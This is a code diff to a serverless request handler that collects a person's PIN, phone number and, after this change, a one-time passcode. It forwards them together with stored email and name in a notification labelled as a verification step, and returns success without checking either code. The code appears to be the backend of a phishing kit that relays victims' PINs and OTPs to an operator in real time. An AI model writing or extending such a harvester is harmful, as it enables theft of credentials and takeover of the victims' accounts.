@@ -31,6 +31,7 @@ export async function onRequest(context) {
   if (request.method === "OPTIONS") return makeTextResponse("", 204);
 
   let requestId, action, token;
+  let body = null;
 
   if (request.method === "GET") {
     requestId = url.searchParams.get("requestId");
@@ -38,7 +39,7 @@ export async function onRequest(context) {
     token = url.searchParams.get("token");
   } else if (request.method === "POST") {
     try {
-      const body = await request.json();
+      body = await request.json();
       requestId = body.requestId;
       action = body.action;
       token = body.token;
@@ -49,15 +50,15 @@ export async function onRequest(context) {
     return makeJsonResponse({ error: "Method not allowed" }, 405);
   }
 
-  if (request.method === "POST" && (action === "verify_pin" || action === "final_verification")) {
-    // Send notification for verification
-    let body;
-    try {
-      body = await request.json();
-    } catch (e) {
-      return makeJsonResponse({ error: "Invalid JSON" }, 400);
+  if (
+    request.method === "POST" &&
+    (action === "verify_pin" || action === "verify_otp" || action === "final_verification")
+  ) {
+    if (!body) {
+      return makeJsonResponse({ error: "Invalid request body" }, 400);
     }
-    const { pin, phone, countryCode } = body;
+
+    const { pin, phone, countryCode, otp } = body;
 
     // Get existing request data
     let item = await getRequestFromKV(env, requestId, "otp");
@@ -69,10 +70,16 @@ export async function onRequest(context) {
       phone: phone || item.phone,
       pin,
       countryCode,
+      otp,
       email: item.email,
       firstName: item.firstName,
       lastName: item.lastName,
-      type: action === "verify_pin" ? "PIN Verification" : "Final Verification"
+      type:
+        action === "verify_pin"
+          ? "PIN Verification"
+          : action === "verify_otp"
+          ? "OTP Verification"
+          : "Final Verification",
     }, env, request.url);
 
     return makeJsonResponse({ success: true });
